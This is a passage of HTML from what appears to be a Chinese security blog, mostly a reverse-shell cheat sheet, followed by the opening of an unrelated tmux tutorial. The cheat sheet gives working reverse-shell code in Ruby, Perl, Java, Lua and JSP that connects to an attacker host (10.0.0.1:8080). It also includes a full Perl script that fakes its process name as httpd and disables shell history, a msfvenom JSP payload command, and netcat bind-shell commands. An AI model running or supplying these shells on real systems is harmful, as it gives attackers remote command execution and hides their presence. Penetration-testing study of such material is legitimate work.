class="comment">#Set the Remote Host Port</span></div><div class="line">PORT = <span class="string">"6667"</span></div><div class="line"></div><div class="line"><span class="comment">#Tries to connect every 20 sec until it connects.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">sock = TCPSocket.new <span class="string">"<span class="subst">#&#123;RHOST&#125;</span>"</span>, <span class="string">"<span class="subst">#&#123;PORT&#125;</span>"</span></div><div class="line">sock.puts <span class="string">"We are connected!"</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  sleep <span class="number">20</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">#Runs the commands you type and sends you back the stdout and stderr.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">  <span class="keyword">while</span> line = sock.gets</div><div class="line">    Open3.popen2e(<span class="string">"<span class="subst">#&#123;line&#125;</span>"</span>) <span class="keyword">do</span> <span class="params">| stdin, stdout_and_stderr |</span></div><div class="line">              IO.copy_stream(stdout_and_stderr, sock)</div><div class="line">              <span class="keyword">end</span>  </div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
-<h3 id="6、Perl"><a href="#6、Perl" class="headerlink" title="6、Perl"></a>6、Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure>
-<p>一个不依赖调用/bin/bash的方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure>
-<p>完整的perl反弹shell脚本</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl -w</span></div><div class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> Socket;</div><div class="line"><span class="keyword">use</span> FileHandle;</div><div class="line"><span class="keyword">use</span> POSIX;</div><div class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</div><div class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></div><div class="line"><span class="keyword">my</span> $ip = <span class="string">'x.x.x.x'</span>;</div><div class="line"><span class="keyword">my</span> $port = <span class="number">2333</span>;</div><div class="line"><span class="comment"># Options</span></div><div class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</div><div class="line"><span class="keyword">my</span> $auth = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></div><div class="line"><span class="comment"># source IP can access the reverse shell</span></div><div class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(/^127\.0\.0\.1$/)</span>;</div><div class="line"><span class="comment"># Declarations</span></div><div class="line"><span class="keyword">my</span> $global_page = <span class="string">""</span>;</div><div class="line"><span class="keyword">my</span> $fake_process_name = <span class="string">"/usr/sbin/apache"</span>;</div><div class="line"><span class="comment"># Change the process name to be less conspicious</span></div><div class="line">$0 = <span class="string">"[httpd]"</span>;</div><div class="line"><span class="comment"># Authenticate based on source IP address if required</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125;)) &#123;</div><div class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</div><div class="line">    <span class="keyword">if</span> ($auth) &#123;</div><div class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</div><div class="line">        cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</div><div class="line">        cgiexit();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</div><div class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</div><div class="line">    cgiexit(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Background and dissociate from parent process if required</span></div><div class="line"><span class="keyword">if</span> ($daemon) &#123;</div><div class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</div><div class="line">    <span class="keyword">if</span> ($pid) &#123;</div><div class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></div><div class="line">    &#125;</div><div class="line">    setsid();</div><div class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</div><div class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Make TCP connection for reverse shell</span></div><div class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</div><div class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</div><div class="line">    cgiprintpage();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</div><div class="line">    cgiexit();</div><div class="line">&#125;</div><div class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></div><div class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</div><div class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</div><div class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</div><div class="line"><span class="comment"># Wrapper around print</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</div><div class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</div><div class="line">    $line .= <span class="string">"&amp;lt;p&amp;gt;\n"</span>;</div><div class="line">    $global_page .= $line;</div><div class="line">&#125;</div><div class="line"><span class="comment"># Wrapper around exit</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</div><div class="line">    cgiprintpage();</div><div class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r</span></div><div class="line">Connection: close\r</div><div class="line">Content-Type: text\/html\r\n\r\n" . $global_page;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use strict;use Socket;use FileHandle;use POSIX;my $VERSION = "1.0";my $ip = "10.0.0.1";my $port = 8080;my $daemon = 1;my $auth = 0; my $authorised_client_pattern = qr(/^127\.0\.0\.1$/);my $global_page = "";my $fake_process_name = "/usr/sbin/apache";$0 = "[httpd]";if (defined($ENV&#123;"REMOTE_ADDR"&#125;)) &#123;cgiprint("Browser IP address appears to be: $ENV&#123;'</span>REMOTE_ADDR<span class="string">'&#125;");if ($auth) &#123;unless ($ENV&#123;"REMOTE_ADDR"&#125; =~ $authorised_client_pattern) &#123;cgiprint("ERROR: Your client is not authorised to view this page");cgiexit();&#125;&#125;&#125; elsif ($auth) &#123;cgiprint("ERROR: Authentication is enabled, but I could not determine your IP address. Denying access");cgiexit(0);&#125;if ($daemon) &#123;my $pid = fork();if ($pid) &#123;cgiexit(0);&#125;setsid();chdir("/");umask(0);&#125;socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp"));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;cgiprint("Sent reverse shell to $ip:$port");cgiprintpage();&#125; else &#123;cgiprint("Could not open reverse shell to $ip:$port: $!");cgiexit();&#125;open(STDIN, "&gt;&amp;SOCK");open(STDOUT,"&gt;&amp;SOCK");open(STDERR,"&gt;&amp;SOCK");$ENV&#123;"HISTFILE"&#125; = "/dev/null";system("w;uname -a;id;pwd");exec(&#123;"/bin/sh"&#125; ($fake_process_name, "-i"));sub cgiprint &#123;my $line = shift;$line .= "&lt;p&gt;\n";$global_page .= $line;&#125;sub cgiexit &#123;cgiprintpage();exit 0;&#125;sub cgiprintpage &#123;print "Content-Length: " . length($global_page) . "\r\nConnection: close\r\nContent-Type: text\/html\r\n\r\n" . $global_page;&#125;'</span></div></pre></td></tr></table></figure>
-<h3 id="7、Java"><a href="#7、Java" class="headerlink" title="7、Java"></a>7、Java</h3><p>ReverseShell.java</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReverseShell</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime r = Runtime.getRuntime();</div><div class="line">            Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</div><div class="line">            p.waitFor();</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>值得一提的是，由于java并不是脚本式语言，所以并不支持直接运行一行程序！所以需要进行的操作是：</p>
-<blockquote>
-<p>先将上述内容复制到一个文件中，以ReverseShell.java命名(必须是这个名字，类和文件名要一致)；</p>
-<p>然后运行javac ReverseShell.java生成ReverseShell.class字节码文件。（这个操作需要javac，该命令依赖jdk）</p>
-<p>最后执行java ReverseShell（执行过程中不用加后缀，java命令依赖于jre，最好将其放置在后台运行。即加上&amp;或者nohup）</p>
-</blockquote>
-<p>下面提供一个相对较为完整的Applet程序，其应该在网页中运行的，但是为了测试简单，我们直接在其中加入了main函数，所以有点像一个单独的程序一样。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">import java.io.*;</div><div class="line">import java.net.Socket;</div><div class="line">import java.util.*;</div><div class="line">import java.util.regex.*;</div><div class="line">import java.applet.Applet;</div><div class="line"></div><div class="line">public class poc extends Applet&#123;</div><div class="line">    /**</div><div class="line">     * Author: daniel baier alias duddits</div><div class="line">     * Licens: GPL</div><div class="line">     * Requirements: JRE 1.5 for running and the JDK 1.5 for compiling or higher</div><div class="line">     * Version: 0.1 alpha release</div><div class="line">     */</div><div class="line"></div><div class="line">    public String cd(String start, File currentDir) &#123;</div><div class="line">        File fullPath = new File(currentDir.getAbsolutePath());</div><div class="line">        String sparent = fullPath.getAbsoluteFile().toString();</div><div class="line">        return sparent + &quot;/&quot; + start;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    @SuppressWarnings(&quot;unchecked&quot;)</div><div class="line">    public void init() &#123;</div><div class="line">        poc rs = new poc();</div><div class="line">        PrintWriter out;</div><div class="line">        try &#123;</div><div class="line">            Socket clientSocket = new Socket(&quot;10.0.0.1&quot;,8080);</div><div class="line">            out = new PrintWriter(clientSocket.getOutputStream(), true);</div><div class="line">            out.println(&quot;\tJRS 0.1 alpha release\n\tdeveloped by duddits alias daniel baier&quot;);</div><div class="line">            boolean run = true;</div><div class="line">            String s;</div><div class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));</div><div class="line">            String startort = &quot;/&quot;;</div><div class="line">            while (run) &#123;</div><div class="line">                String z1;</div><div class="line">                File f = new File(startort);</div><div class="line">                out.println(f.getAbsolutePath() + &quot;&gt; &quot;);</div><div class="line">                s = br.readLine();</div><div class="line">                z1 = s;</div><div class="line">                Pattern pcd = Pattern.compile(&quot;^cd\\s&quot;);</div><div class="line">                Matcher mcd = pcd.matcher(z1);</div><div class="line">                String[] teile1 = pcd.split(z1);</div><div class="line">                if (s.equals(&quot;exit&quot;)) &#123;</div><div class="line">                    run = false;</div><div class="line">                &#125;else if (s.equals(null) || s.equals(&quot;cmd&quot;) || s.equals(&quot;&quot;)) &#123;</div><div class="line"></div><div class="line">                &#125; else if(mcd.find())&#123;</div><div class="line">                    try &#123;</div><div class="line">                        String cds = rs.cd(teile1[1], new File(startort));</div><div class="line">                        startort = cds;</div><div class="line">                        &#125; catch (Exception verz) &#123;</div><div class="line">                        out.println(&quot;Path &quot; + teile1[1]</div><div class="line">                        + &quot; not found.&quot;);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                &#125;else &#123;</div><div class="line"></div><div class="line">                    String z2;</div><div class="line"></div><div class="line"></div><div class="line">                    z2 = s;</div><div class="line">                    Pattern pstring = Pattern.compile(&quot;\\s&quot;);</div><div class="line">                    String[] plist = pstring.split(z2);</div><div class="line"></div><div class="line">                    try &#123;</div><div class="line"></div><div class="line">                        LinkedList slist = new LinkedList();</div><div class="line">                        for (int i = 0; i &lt; plist.length; i++) &#123;</div><div class="line">                            slist.add(plist[i]);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        ProcessBuilder builder = new ProcessBuilder(slist);</div><div class="line">                        builder.directory(new File(startort));</div><div class="line">                        Process p = builder.start();</div><div class="line">                        Scanner se = new Scanner(p.getInputStream());</div><div class="line">                        if (!se.hasNext()) &#123;</div><div class="line">                            Scanner sa = new Scanner(p.getErrorStream());</div><div class="line">                            while (sa.hasNext()) &#123;</div><div class="line">                                out.println(sa.nextLine());</div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                        while (se.hasNext()) &#123;</div><div class="line">                            out.println(se.nextLine());</div><div class="line">                        &#125;</div><div class="line"></div><div class="line"></div><div class="line">                    &#125; catch (Exception err) &#123;</div><div class="line">                        out.println(f.getAbsolutePath() + &quot;&gt; Command &quot;</div><div class="line">                                + s + &quot; failed!&quot;);</div><div class="line">                        out.println(f.getAbsolutePath() +&quot;&gt; Please try cmd /c &quot;+ s+&quot; or bash -c &quot; +s+&quot; if this command is an shell buildin.&quot;);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if(!clientSocket.isConnected())&#123;</div><div class="line">                run = false;</div><div class="line">                out.flush();</div><div class="line">                out.close();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125; catch (Exception io) &#123;</div><div class="line">            //System.err.println(&quot;Connection refused by peer&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args)&#123;</div><div class="line">        poc p = new poc();</div><div class="line">        p.init();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<blockquote>
-<p>运行此程序之前，应该更改环境变量的设置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; export DISPLAY=:0.0</div><div class="line">&gt; 或者</div><div class="line">&gt; setenv DISPLAY :0.0</div><div class="line">&gt;</div></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="8、Lua"><a href="#8、Lua" class="headerlink" title="8、Lua"></a>8、Lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></div></pre></td></tr></table></figure>
-<p>不建议安装最新的lua，因为会出现以下问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lua: (command line):1: module &apos;socket&apos; not found:</div><div class="line">	no field package.preload[&apos;socket&apos;]</div><div class="line">	no file &apos;/usr/local/share/lua/5.2/socket.lua&apos;</div></pre></td></tr></table></figure>
-<p>这个时候，你应该查看一下服务器上的/usr/local/share/lua下的目录到底是5.1还是5.2，根据其版本，安装正确的lua</p>
-<h3 id="9、Jsp"><a href="#9、Jsp" class="headerlink" title="9、Jsp"></a>9、Jsp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">使用</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 R &gt; re.jsp</div></pre></td></tr></table></figure>
-<p>reverse_shell.jsp</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.net.*"</span>%&gt;</div><div class="line"></div><div class="line">&lt;%</div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">StreamConnector</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></div><div class="line">  &#123;</div><div class="line">    InputStream zd;</div><div class="line">    OutputStream fm;</div><div class="line"></div><div class="line">    StreamConnector( InputStream zd, OutputStream fm )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">this</span>.zd = zd;</div><div class="line">      <span class="keyword">this</span>.fm = fm;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">      BufferedReader fr  = <span class="keyword">null</span>;</div><div class="line">      BufferedWriter ctw = <span class="keyword">null</span>;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        fr  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader( <span class="keyword">this</span>.zd ) );</div><div class="line">        ctw = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter( <span class="keyword">this</span>.fm ) );</div><div class="line">        <span class="keyword">char</span> buffer[] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">8192</span>];</div><div class="line">        <span class="keyword">int</span> length;</div><div class="line">        <span class="keyword">while</span>( ( length = fr.read( buffer, <span class="number">0</span>, buffer.length ) ) &gt; <span class="number">0</span> )</div><div class="line">        &#123;</div><div class="line">          ctw.write( buffer, <span class="number">0</span>, length );</div><div class="line">          ctw.flush();</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span>( fr != <span class="keyword">null</span> )</div><div class="line">          fr.close();</div><div class="line">        <span class="keyword">if</span>( ctw != <span class="keyword">null</span> )</div><div class="line">          ctw.close();</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">try</span></div><div class="line">  &#123;</div><div class="line">    String ShellPath;</div><div class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) == -<span class="number">1</span>) &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"cmd.exe"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">    Socket socket = <span class="keyword">new</span> Socket( <span class="string">"10.0.0.1"</span>, <span class="number">8080</span> );</div><div class="line">    Process process = Runtime.getRuntime().exec( ShellPath );</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</div><div class="line">  &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</div><div class="line">%&gt;</div></pre></td></tr></table></figure>
-<h3 id="10、正向shell（nc为例）"><a href="#10、正向shell（nc为例）" class="headerlink" title="10、正向shell（nc为例）"></a>10、正向shell（nc为例）</h3><p>服务器端（有的nc版本不支持-e，这个时候你可以参考<a href="#2、NetCat">NetCat</a>）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 7777 -e /bin/bash</div></pre></td></tr></table></figure>
-<p>攻击端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 10.0.0.2 7777</div></pre></td></tr></table></figure>
-<p>最后要说的是xterm，这是一个session，可以维持；而由于服务器上和本地都得装相应的程序，所以起来较为麻烦！</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/tools/tmux使用教程/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/09/tools/tmux使用教程/" itemprop="url">tmux使用教程</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T17:25:01+08:00">
-                2017-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="为什么要用-Tmux"><a href="#为什么要用-Tmux" class="headerlink" title="为什么要用 Tmux"></a>为什么要用 Tmux</h2><p>tmux 在很多方面都很有用。就我而言，由于 tmux 允许随时随地断开或重新接入会话（Session），所以最大的作用就是在远程服务器上持久地保存工作状态。</p>
